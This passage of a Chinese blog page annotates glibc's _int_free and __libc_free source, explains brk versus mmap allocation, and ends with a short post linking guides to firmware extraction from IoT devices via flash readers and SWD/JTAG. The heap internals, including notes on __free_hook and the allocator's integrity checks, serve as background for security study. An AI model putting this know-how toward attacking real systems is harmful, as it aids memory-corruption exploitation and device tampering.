class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size(要 free 的 chunk 的大小) */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin(关联的 fastbin) */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk(下一个 chunk) */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size(下一个 chunk 的大小) */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used(当下一个 chunk 正在使用是就为 1) */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk (上一个 chunk 的大小)*/</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking(指向链表（bin）中的上一个块) */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking(指向链表（bin）中的下一个块) */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);<span class="comment">//获取需要释放的chunk大小</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line">    -------------------------------------------------------------</span><br><span class="line">        安全检查代码，chunk的指针地址不能溢出，chunk的大小必须是按<span class="number">2</span>*size_sz对齐且大于等于minsize</span><br><span class="line">        -------------------------------------------</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">    满足tcache的条件则放入tcache，tcache有位置。</span><br><span class="line">    ------------------------------------------------------------------</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">	bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">			  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">	   getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (!have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">	    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">	    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fail)</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">---------------------------------</span><br><span class="line">    如果当前<span class="built_in">free</span>的chunk属于fastbins 查看下一个相邻的chunk的大小是否小于等于<span class="number">2</span>*size_sz，下一个相邻chunk的大小是否大于分配区所分配的内存总量，如果是则报错。</span><br><span class="line">    --------------------------------------------</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">    设置当权分配区的fastbiflag  表示当前分配区的fastbin中已有空闲chuank，然后根据当前<span class="built_in">free</span>的chunk大小获取所属的fastbin</span><br><span class="line">    ----------------------------------------------------------------</span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	   add (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">	p-&gt;fd = old;</span><br><span class="line">	*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	     add (i.e., double free).  */</span></span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">	  p-&gt;fd = old2 = old;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">	     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">	&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re single-threaded, don&#x27;t lock the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">			  &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">			  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">	not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">	been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">	    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">	  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">	   large, because the corresponding heap might go away.  */</span></span><br><span class="line">	heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">	assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="linux进程分配内存的两种方式brk-mmap"><a href="#linux进程分配内存的两种方式brk-mmap" class="headerlink" title="linux进程分配内存的两种方式brk(),mmap()"></a>linux进程分配内存的两种方式brk(),mmap()</h2><blockquote>
<p>两者分配的都是虚拟内存。</p>
<p>brk将数据段的最高地址指针_edata往高地址推</p>
<p>mmap是在进程的虚拟地址空间中（堆和栈的中间，也就是文件映射区域）找一块空闲的虚拟内存。</p>
</blockquote>
<h3 id="情况一、malloc小于128k的内存"><a href="#情况一、malloc小于128k的内存" class="headerlink" title="情况一、malloc小于128k的内存"></a>情况一、malloc小于128k的内存</h3><p>使用brk分配内存，将_edata往高地址推(只分配虚拟空间，不对应物理内存(因此没有初始化)，第一次读/写数据时，引起内核缺页中断，内核才分配对应的物理内存，然后虚拟地址空间建立映射关系)，如下图：</p>
<p><img src="https://img-blog.csdn.net/20130625110751828?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRExVVEJydWNlWmhhbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"></p>
<p><strong>1、进程启动的时候，其（虚拟）内存空间的初始布局如图1所示。</strong><br>   其中，mmap内存映射文件是在堆和栈的中间（例如libc-2.2.93.so，其它数据文件等），为了简单起见，省略了内存映射文件。<br>   _edata指针（glibc里面定义）指向数据段的最高地址。<br><strong>2、进程调用A=malloc(30K)以后，内存空间如图2：</strong><br>   malloc函数会调用brk系统调用，将_edata指针往高地址推30K，就完成虚拟内存分配。<br>   你可能会问：只要把_edata+30K就完成内存分配了？<br>   事实是这样的，_edata+30K只是完成虚拟地址的分配，A这块内存现在还是没有物理页与之对应的，等到进程第一次读写A这块内存的时候，发生缺页中断，这个时候，内核才分配A这块内存对应的物理页。也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。<br><strong>3、进程调用B=malloc(40K)以后，内存空间如图3。</strong></p>
<h3 id="情况二、malloc大于128k的内存"><a href="#情况二、malloc大于128k的内存" class="headerlink" title="情况二、malloc大于128k的内存"></a>情况二、malloc大于128k的内存</h3><p>使用mmap分配内存，在堆和栈之间找一块空闲内存分配(对应独立内存，而且初始化为0)，如下图：</p>
<p><img src="https://img-blog.csdn.net/20130625110817750?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRExVVEJydWNlWmhhbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"></p>
<p><strong>4、进程调用C=malloc(200K)以后，内存空间如图4：</strong></p>
<p>   默认情况下，malloc函数分配内存，如果请求内存大于128K（可由M_MMAP_THRESHOLD选项调节），那就不是去推_edata指针了，而是利用mmap系统调用，从堆和栈的中间分配一块虚拟内存。</p>
<p>   这样子做主要是因为:</p>
<p>   brk分配的内存需要等到高地址内存释放以后才能释放（例如，在B释放之前，A是不可能释放的，这就是内存碎片产生的原因，什么时候紧缩看下面），而mmap分配的内存可以单独释放。</p>
<p>   当然，还有其它的好处，也有坏处，再具体下去，有兴趣的同学可以去看glibc里面malloc的代码了。<br><strong>5、进程调用D=malloc(100K)以后，内存空间如图5；</strong><br><strong>6、进程调用free(C)以后，C对应的虚拟内存和物理内存一起释放。</strong></p>
<p><img src="https://img-blog.csdn.net/20130625110835437?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRExVVEJydWNlWmhhbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"></p>
<p><strong>7、进程调用free(B)以后，如图7所示：</strong><br>​    <code>B对应的虚拟内存和物理内存都没有释放</code>，因为只有一个_edata指针，如果往回推，那么D这块内存怎么办呢？<br>当然，<code>B这块内存，是可以重用的，</code>如果这个时候再来一个40K的请求，那么malloc很可能就把B这块内存返回回去了。<br><strong>8、进程调用free(D)以后，如图8所示：</strong><br>​    B和D连接起来，变成一块140K的空闲内存。<br><strong>9、默认情况下：</strong><br>​    当最高地址空间的空闲内存超过128K（可由M_TRIM_THRESHOLD选项调节）时，执行内存紧缩操作（trim）。在上一个步骤free的时候，发现最高地址空闲内存超过128K，于是内存紧缩，变成图9所示。</p>
<h2 id="libc-free-、int-free"><a href="#libc-free-、int-free" class="headerlink" title="libc_free()、int_free()"></a>libc_free()、int_free()</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/crybaby/p/12940235.html">https://www.cnblogs.com/crybaby/p/12940235.html</a>   int_free()</p>
<p><a target="_blank" rel="noopener" href="https://dongshao.blog.csdn.net/article/details/99071778">https://dongshao.blog.csdn.net/article/details/99071778</a>   libc_free() free hook  </p>
<h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="libc_free():"></a>libc_free():</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)<span class="comment">//mem是之前malloc后返回给用户的指针</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)<span class="comment">//读取free_hook全局变量，返回一个函数指针</span></span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">//与malloc类似，用内置函数判断hook函数指针是否为空，不为空则执行hook函数，然后返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> conversion from malloc headers to user pointers, and back </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="comment">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">去除头(header)和加上头的地址</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">低地址----------------- chunk分配的大小</span></span><br><span class="line"><span class="comment">高地址-----------------  mem返回给用户的大小</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* 如果是mmap的堆块，调用munmap进行释放*/</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">	 Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">	  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);<span class="comment">//获取arena</span></span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);<span class="comment">//释放</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其主要内容：</p>
<ul>
<li><blockquote>
<p>①检查是否有__free_hook</p>
</blockquote>
</li>
<li><blockquote>
<p>②如果堆块为NULL，则什么都不做</p>
</blockquote>
</li>
<li><blockquote>
<p>③如果是mmap的堆块，调用munmap进行释放</p>
</blockquote>
</li>
<li><blockquote>
<p>④否则最后调用_int_free函数释放堆块</p>
</blockquote>
</li>
</ul>
<p>int free流程;</p>
<p>先判断是否大小在tcachebin中，tcache是否有位置，有则放入tcachebin中。</p>
<p>其次怕段是否是fastbin，是则插入fastbin</p>
<p>如果不是mmapchunk判断nextchunk是否为空闲，是则合并,查看iuse位（<strong>top chunk除外</strong>），将合并后的chunk插入unsorted bin中</p>
<p><strong>如果和topchunk相邻则并入topchunk。</strong></p>
<p>不相邻不是fatbin、tcachebin，直接进入垃圾桶unsorted bin中。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/07/18/iot1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/07/18/iot1/" class="post-title-link" itemprop="url">iot1</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-07-18 19:10:54" itemprop="dateCreated datePublished" datetime="2021-07-18T19:10:54+08:00">2021-07-18</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-01-10 18:12:33" itemprop="dateModified" datetime="2022-01-10T18:12:33+08:00">2022-01-10</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><a target="_blank" rel="noopener" href="https://delikely.github.io/2021/01/11/%E5%85%8D%E6%8B%86%E8%8A%AF%E7%89%87%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6/">https://delikely.github.io/2021/01/11/%E5%85%8D%E6%8B%86%E8%8A%AF%E7%89%87%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6/</a></p>
<p>​                                   ———–免拆芯片提取固件（高质量）</p>
<p>1.热风枪吹，将flash拿下来放进flash编程器中读取</p>
<p>2.内含芯片封装和针脚的知识</p>
<p>3.当固件没有被存储在外置的flash上，而是在mcu的内置flash中，这时候需要通过调试接口（swd/jtag等）对固件进行提取，也可以动态调试。</p>
<p><a target="_blank" rel="noopener" href="https://yaseng.org/iot-security-hardware-obtain.html">https://yaseng.org/iot-security-hardware-obtain.html</a></p>
<p>​         ————-编程器直接提取固件的方法（基础）</p>
